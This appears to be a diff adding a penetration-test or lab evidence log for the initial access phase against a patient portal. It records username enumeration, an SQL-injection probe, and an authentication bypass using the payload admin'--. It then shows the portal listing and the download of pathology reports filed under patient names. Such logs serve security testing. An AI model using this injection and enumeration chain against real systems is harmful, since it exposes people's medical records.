@@ -1,0 +1,32 @@
+===== M1 INITIAL ACCESS EVIDENCE =====
+
+[1] Username enumeration
+test → Username not found
+admin → Incorrect password
+
+[2] SQL injection
+Controlled SQL input produced MySQL syntax warning.
+
+[3] Authentication bypass
+username=admin'--
+Result: HTTP 302 → /patient/portal.php
+
+[4] Patient portal
+          <div class="name">Pathology Report - S. Dlamini</div>
+          <div class="meta">Lab Ref LR-2024-1187 &nbsp;|&nbsp; 2024-11-04 &nbsp;|&nbsp; PDF (encrypted)</div>
+        <a class="dl" href="download.php?id=1">Download</a>
+          <div class="name">Pathology Report - P. Reddy</div>
+          <div class="meta">Lab Ref LR-2024-1192 &nbsp;|&nbsp; 2024-11-05 &nbsp;|&nbsp; PDF (encrypted)</div>
+        <a class="dl" href="download.php?id=2">Download</a>
+          <div class="name">Pathology Report - E. Thompson</div>
+          <div class="meta">Lab Ref LR-2024-1205 &nbsp;|&nbsp; 2024-11-06 &nbsp;|&nbsp; PDF (encrypted)</div>
+        <a class="dl" href="download.php?id=3">Download</a>
+
+[5] Retrieved reports
+m1/reports/report-1.pdf: PDF document, version 1.4, 1 page(s)
+m1/reports/report-2.pdf: PDF document, version 1.4, 1 page(s)
+m1/reports/report-3.pdf: PDF document, version 1.4, 1 page(s)
+total 12K
+-rw-rw-r-- 1 lakkappa lakkappa 3.6K Sep 30 22:00 report-1.pdf
+-rw-rw-r-- 1 lakkappa lakkappa 3.6K Sep 30 22:00 report-2.pdf
+-rw-rw-r-- 1 lakkappa lakkappa 3.7K Sep 30 22:00 report-3.pdf
